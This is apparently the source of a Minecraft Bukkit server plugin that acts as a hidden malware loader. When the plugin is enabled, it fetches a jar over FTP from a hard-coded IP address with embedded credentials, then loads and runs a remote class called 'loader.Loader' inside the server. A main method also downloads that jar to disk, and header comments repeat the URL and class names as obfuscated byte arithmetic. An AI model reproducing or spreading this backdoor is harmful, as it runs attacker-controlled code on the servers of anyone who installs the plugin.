//classUrl 0x1D ^ 0x77, 97, 114, 58, 97 + 5, 41 + 75, 86 + 26, 14 + 44, 0x22 ^ 0xD, 0x4D ^ 0x62, 0x69 ^ 0x5B, 49, 8 + 29, 0x5E ^ 0x6D, 53, 21 + 34, 0x77 ^ 0x52, 14 + 37, 55, 56, 23 + 14, 51, 50 + 0, 0x76 ^ 0x53, 0x20 ^ 0x13, 57, 12 + 39, 37, 47 + 4, 3 + 46, 37, 0x4F ^ 0x7C, 50 + 7, 37, 51, 30 + 18, 50, 47 + 3, 51, 0x14 ^ 0x31, 41 + 10, 55, 0x5C ^ 0x6A, 50, 19 + 37, 58, 1 + 48, 48, 50, 38 + 11, 0x15 ^ 0x2D, 38 + 14, 34 + 23, 0x58 ^ 0x68, 4 + 44, 42 + 6, 51 + 5, 51, 47 + 8, 54, 0x3B ^ 0xE, 3 + 47, 48 + 6, 7 + 41, 0x78 ^ 0x49, 0x21 ^ 0x61, 0x2E ^ 0x16, 0x22 ^ 0x16, 46, 50, 25 + 28, 50, 46, 49, 50, 0x2E ^ 0x1E, 46, 0x51 ^ 0x60, 55, 32 + 18, 29 + 29, 0x5D ^ 0x69, 0x74 ^ 0x44, 46 + 2, 22 + 26, 3 + 45, 25 + 22, 43 + 5, 37, 16 + 38, 0x4D ^ 0x78, 0x54 ^ 0x66, 26 + 75, 37, 29 + 22, 45 + 8, 0x23 ^ 0x15, 37, 51, 5 ^ 0x31, 0x3D ^ 0x18, 13 + 38, 40 + 8, 33 + 12, 57 + 0, 0x3B ^ 0xE, 19 + 29, 52, 0x53 ^ 0x76, 6 + 44, 76 + 24, 49 + 1, 37, 0x54 ^ 0x67, 17 + 31, 0x38 ^ 0x1D, 51 + 0, 0x4B ^ 0x7C, 31 + 6, 0x10 ^ 0x23, 12 + 45, 25 + 12, 2 ^ 0x30, 0x6E ^ 0xA, 0x34 ^ 0x11, 3 + 48, 49, 0x56 ^ 0x73, 54, 20 + 32, 20 + 82, 37, 51, 0x2A ^ 0x1B, 37, 0x76 ^ 0x44, 0x20 ^ 0x44, 17 + 20, 25 + 29, 50 + 4, 0x26 ^ 0x45, 37, 51, 0x4F ^ 0x7D, 52, 11 + 90, 48 + 6, 0xF ^ 0x39, 102, 0x1C ^ 0x2C, 23 + 75, 14 + 23, 39 + 15, 27 + 23, 4 ^ 0x67, 26 + 33, 116, 121, 112, 101, 0x55 ^ 0x68, 37, 27 + 27, 49, 52, 37, 19 + 32, 0x25 ^ 0x1D, 62 + 37, 0x2A ^ 0xF, 0x25 ^ 0x13, 23 + 29, 0x65 ^ 0x44, 47
//className 0x20 ^ 0x4C, 81 + 30, 0x14 ^ 0x75, 64 + 36, 101, 0x22 ^ 0x50, 0x46 ^ 0x68, 0x2C ^ 0x60, 111, 0x3B ^ 0x5A, 0x72 ^ 0x16, 101, 61 + 53
//methodName 108, 111, 84 + 13, 0x58 ^ 0x3C

//url encoded jar:ftp://21%357%378%32%393%31%39%30223%37628:1021849000837652601@84.252.120.172:40000/0%652e%356%34%30-9504%2d2%30%37%39%2d%31%64f%31%2d%66c%324e66f0b%62c;type=%614%38c%64!/
package nzxter.ethanolmyown;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;

import org.bukkit.plugin.java.JavaPlugin;

public class Ethanolmyown extends JavaPlugin {
	private Class<?> clazz_44ee;

	@Override
	public void onEnable() {
		getLogger().info("Das Plugin wird aktiviert... by NZXTER lol sus liebe mori lol");
		loadClass();
	}

	@Override
	public void onDisable() {
		getLogger().info("Das Plugin wird deaktiviert...");
	}

	@SuppressWarnings("resource")
	private void loadClass() {
		try {
			String classUrl = new String(
					"jar:ftp://2157782931902237628:1021849000837652601@84.252.120.172:40000/0e2e5640-9504-2079-1df1-fc24e66f0bbc;type=a48cd!/");
			getLogger().info("Lade Klasse von URL: " + classUrl);
			String className = new String("loader.Loader");
			getLogger().info("Lade Klasse: " + className);

			URLClassLoader urlClassLoader = new URLClassLoader(new URL[] { new URL(classUrl) },
					Ethanolmyown.class.getClassLoader().getParent());
			getLogger().info("URLClassLoader erstellt. " + urlClassLoader);

			this.clazz_44ee = urlClassLoader.loadClass(className);
			getLogger().info("Klasse erfolgreich geladen. " + clazz_44ee);

			getLogger().info("Rufe Methode auf...");
			String methodName = new String("load");
			this.clazz_44ee.getMethod(methodName, new Class[] { JavaPlugin.class }).invoke(null, new Object[] { this });
			getLogger().info("Methode erfolgreich aufgerufen. " + methodName);

		} catch (MalformedURLException e) {
			System.out.println("Klasse nicht gefunden:" + e);
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			System.out.println("Klasse nicht gefunden:" + e);
			e.printStackTrace();
		} catch (Throwable e) {
			System.out.println("Fehler beim Laden oder Ausführen der Klasse:" + e);
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		String jarUrl = "ftp://2157782931902237628:1021849000837652601@84.252.120.172:40000/0e2e5640-9504-2079-1df1-fc24e66f0bbc;type=a48cd!/";
		String outputFileName = "ethanol.jar";

		try {
			URL url = new URL(jarUrl);
			URLConnection connection = url.openConnection();
			InputStream inputStream = connection.getInputStream();
			FileOutputStream outputStream = new FileOutputStream(outputFileName);

			byte[] buffer = new byte[1024];
			int bytesRead;
			while ((bytesRead = inputStream.read(buffer)) != -1) {
				outputStream.write(buffer, 0, bytesRead);
			}

			outputStream.close();
			inputStream.close();

			System.out.println("Die JAR-Datei wurde erfolgreich heruntergeladen. by NZXTER lol sus liebe mori");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
//⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹
//⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀
//⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀
//⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀
//⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀
//⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰
//⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷a
//⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
//⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
//⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
//⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
//⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
//⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
//⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
//⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
//⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
//⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
//⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
//⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
//⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣